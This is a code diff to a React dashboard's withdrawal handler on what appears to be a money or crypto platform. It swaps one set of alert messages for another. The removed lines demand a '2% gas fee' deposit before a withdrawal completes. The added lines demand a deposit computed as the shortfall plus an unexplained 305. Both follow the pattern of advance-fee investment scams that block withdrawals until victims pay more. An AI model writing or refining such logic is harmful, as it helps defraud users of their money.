@@ -461,22 +461,22 @@ export default function Dashboard() {
                 if (withdrawAmount < minimumRequired) {
                   const shortfall = minimumRequired - user.balance + 305;
                   alert(
-                    `Withdrawal submitted!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
-                      withdrawAmount
-                    )}\n\nInstruction: Please deposit ${formatCurrency(
-                      withdrawAmount * 0.02
-                    )} (2% gas fee) into your own wallet address to complete the withdrawal.`
+                    `You need to deposit ${formatCurrency(
+                      shortfall
+                    )} into your account so your balance is considered eligible enough to be marked for the minimum withdrawal amount of ${formatCurrency(
+                      minimumRequired
+                    )}.`
                   );
                 } else if (
                   withdrawAmount >= minimumRequired &&
                   withdrawAmount > user.balance
                 ) {
                   alert(
-                    `Withdrawal submitted!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
+                    `You don’t have up to ${formatCurrency(
                       withdrawAmount
-                    )}\n\nInstruction: Please deposit ${formatCurrency(
-                      withdrawAmount * 0.02
-                    )} (2% gas fee) into your own wallet address to complete the withdrawal.`
+                    )} in your account. Your current balance is ${formatCurrency(
+                      user.balance
+                    )}.`
                   );
                 } else {
                   alert(
